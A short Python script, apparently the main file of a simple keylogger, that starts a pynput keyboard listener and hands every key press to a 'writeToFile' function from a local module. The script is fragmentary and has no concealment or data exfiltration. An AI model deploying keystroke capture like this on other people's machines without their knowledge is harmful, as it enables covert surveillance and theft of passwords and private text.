from pynput.keyboard import Listener
from logger import writeToFile

# Start the listener
with Listener(on_press=writeToFile) as l:
    l.join()
